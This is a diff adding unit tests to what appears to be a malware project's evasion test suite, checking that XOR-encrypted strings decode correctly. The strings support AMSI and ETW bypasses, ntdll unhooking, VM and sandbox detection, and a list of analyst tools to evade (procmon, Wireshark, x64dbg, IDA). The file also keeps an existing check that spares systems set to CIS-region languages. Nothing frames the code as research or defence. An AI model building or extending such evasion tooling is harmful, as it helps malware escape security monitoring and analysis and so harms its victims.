@@ -19,6 +19,7 @@
 
 /* Use real is_cis_language from detection.c */
 extern int is_cis_language(uint16_t lang_id);
+#include "hash.h"
 
 /* ── Stub implementations for platform-specific functions ────── */
 
@@ -449,6 +450,100 @@ static void test_cis_zero(void) {
     printf("  PASS: test_cis_zero\n");
 }
 
+/* ── Encrypted string decode tests (Phase 4) ────────────── */
+
+/*
+ * Every enc_* array used by evasion sources must decrypt with
+ * MIRAGE_STRING_KEY_ENC into printable, non-empty ASCII.
+ * Catches the stale-key / plaintext-through-XOR class forever.
+ */
+
+#include "enc_strings.h"
+
+static void test_decoded_array(const char *name, const uint8_t *enc, size_t len) {
+    assert(len > 0 && len < 256);
+    char out[256];
+    mirage_xor_decrypt(enc, (uint8_t *)out, len);
+    for (size_t i = 0; i < len; i++) {
+        unsigned char c = (unsigned char)out[i];
+        /* allow CR/LF — the HTTP request template legitimately contains them */
+        if ((c < 0x20 && c != '\r' && c != '\n') || c > 0x7E) {
+            fprintf(stderr, "  FAIL: %s decodes to bad byte 0x%02x at %zu\n",
+                    name, c, i);
+            assert(0 && "enc array does not decode to ASCII");
+        }
+    }
+    printf("  PASS: decode %s -> \"%.*s\"\n", name, (int)len, out);
+}
+
+static void test_decode_evasion_strings(void) {
+    test_decoded_array("enc_ntdll", enc_ntdll, ENC_NTDLL_LEN);
+    test_decoded_array("enc_kernel32", enc_kernel32, ENC_KERNEL32_LEN);
+    test_decoded_array("enc_AmsiScanBuffer", enc_AmsiScanBuffer, ENC_AMSISCANBUFFER_LEN);
+    test_decoded_array("enc_EtwEventWrite", enc_EtwEventWrite, ENC_ETWEVENTWRITE_LEN);
+    test_decoded_array("enc_EtwEventWriteEx", enc_EtwEventWriteEx, ENC_ETWEVENTWRITEEX_LEN);
+    test_decoded_array("enc_EtwEventWriteString", enc_EtwEventWriteString, ENC_ETWEVENTWRITESTRING_LEN);
+    test_decoded_array("enc_amsi_dll", enc_amsi_dll, ENC_AMSI_DLL_LEN);
+    test_decoded_array("enc_LoadLibraryA", enc_LoadLibraryA, ENC_LOADLIBRARYA_LEN);
+
+    /* evasion.c VM / registry arrays */
+    test_decoded_array("enc_reg_bios_path", enc_reg_bios_path, ENC_REG_BIOS_PATH_LEN);
+    test_decoded_array("enc_sys_manufacturer", enc_sys_manufacturer, ENC_SYS_MANUFACTURER_LEN);
+    test_decoded_array("enc_sys_product_name", enc_sys_product_name, ENC_SYS_PRODUCT_NAME_LEN);
+    test_decoded_array("enc_vm_manuf_0", enc_vm_manuf_0, ENC_VM_MANUF_0_LEN);
+    test_decoded_array("enc_vm_manuf_1", enc_vm_manuf_1, ENC_VM_MANUF_1_LEN);
+    test_decoded_array("enc_vm_manuf_2", enc_vm_manuf_2, ENC_VM_MANUF_2_LEN);
+    test_decoded_array("enc_vm_manuf_3", enc_vm_manuf_3, ENC_VM_MANUF_3_LEN);
+    test_decoded_array("enc_vm_manuf_4", enc_vm_manuf_4, ENC_VM_MANUF_4_LEN);
+    test_decoded_array("enc_vm_manuf_5", enc_vm_manuf_5, ENC_VM_MANUF_5_LEN);
+    test_decoded_array("enc_vm_prod_0", enc_vm_prod_0, ENC_VM_PROD_0_LEN);
+    test_decoded_array("enc_vm_prod_1", enc_vm_prod_1, ENC_VM_PROD_1_LEN);
+    test_decoded_array("enc_vm_prod_2", enc_vm_prod_2, ENC_VM_PROD_2_LEN);
+    test_decoded_array("enc_vm_prod_3", enc_vm_prod_3, ENC_VM_PROD_3_LEN);
+    test_decoded_array("enc_vm_prod_4", enc_vm_prod_4, ENC_VM_PROD_4_LEN);
+    test_decoded_array("enc_vm_prod_5", enc_vm_prod_5, ENC_VM_PROD_5_LEN);
+
+    /* evasion.c hosting IP check */
+    test_decoded_array("enc_ip_api_com", enc_ip_api_com, ENC_IP_API_COM_LEN);
+    test_decoded_array("enc_http_get_ipapi", enc_http_get_ipapi, ENC_HTTP_GET_IPAPI_LEN);
+    test_decoded_array("enc_hosting_true", enc_hosting_true, ENC_HOSTING_TRUE_LEN);
+
+    /* anti_analysis.c sandbox process names */
+    test_decoded_array("enc_proc_procmon", enc_proc_procmon, ENC_PROC_PROCMON_LEN);
+    test_decoded_array("enc_proc_wireshark", enc_proc_wireshark, ENC_PROC_WIRESHARK_LEN);
+    test_decoded_array("enc_proc_ollydbg", enc_proc_ollydbg, ENC_PROC_OLLYDBG_LEN);
+    test_decoded_array("enc_proc_ida", enc_proc_ida, ENC_PROC_IDA_LEN);
+    test_decoded_array("enc_proc_ida64", enc_proc_ida64, ENC_PROC_IDA64_LEN);
+    test_decoded_array("enc_proc_x64dbg", enc_proc_x64dbg, ENC_PROC_X64DBG_LEN);
+    test_decoded_array("enc_proc_x32dbg", enc_proc_x32dbg, ENC_PROC_X32DBG_LEN);
+    test_decoded_array("enc_proc_fiddler", enc_proc_fiddler, ENC_PROC_FIDDLER_LEN);
+    test_decoded_array("enc_proc_httpanalyzer", enc_proc_httpanalyzer, ENC_PROC_HTTPANALYZER_LEN);
+    test_decoded_array("enc_proc_procexp", enc_proc_procexp, ENC_PROC_PROCEXP_LEN);
+    test_decoded_array("enc_proc_processhacker", enc_proc_processhacker, ENC_PROC_PROCESSHACKER_LEN);
+    test_decoded_array("enc_proc_tcpview", enc_proc_tcpview, ENC_PROC_TCPVIEW_LEN);
+    test_decoded_array("enc_proc_autoruns", enc_proc_autoruns, ENC_PROC_AUTORUNS_LEN);
+    test_decoded_array("enc_proc_vmtoolsd", enc_proc_vmtoolsd, ENC_PROC_VMTOOLSD_LEN);
+    test_decoded_array("enc_proc_vmwaretray", enc_proc_vmwaretray, ENC_PROC_VMWARETRAY_LEN);
+    test_decoded_array("enc_proc_vboxservice", enc_proc_vboxservice, ENC_PROC_VBOXSERVICE_LEN);
+
+    /* unhook.c */
+    test_decoded_array("enc_unhook_NtOpenSection", enc_unhook_NtOpenSection, ENC_UNHOOK_NTOPENSECTION_LEN);
+    test_decoded_array("enc_unhook_NtReadFile", enc_unhook_NtReadFile, ENC_UNHOOK_NTREADFILE_LEN);
+    printf("  PASS: test_decode_evasion_strings (all arrays)\n");
+}
+
+/* mirage_tzi_struct_size comes from detection.c (test hook) */
+extern size_t mirage_tzi_struct_size(void);
+
+/* ── TIME_ZONE_INFORMATION size test (Phase 4) ───────────── */
+
+static void test_tzi_struct_size(void) {
+    /* Real TIME_ZONE_INFORMATION is 172 bytes; the old LITE decl was
+     * 132 bytes and the kernel wrote 40 bytes past it. */
+    assert(mirage_tzi_struct_size() == 172);
+    printf("  PASS: test_tzi_struct_size (172)\n");
+}
+
 int main(void) {
     printf("=== test_evasion: anti-analysis scoring ===\n");
 
@@ -486,6 +581,8 @@ int main(void) {
     test_cis_german_not_cis();
     test_cis_uzbek();
     test_cis_zero();
+    test_decode_evasion_strings();
+    test_tzi_struct_size();
 
     printf("=== test_evasion: ALL PASSED ===\n");
     return 0;
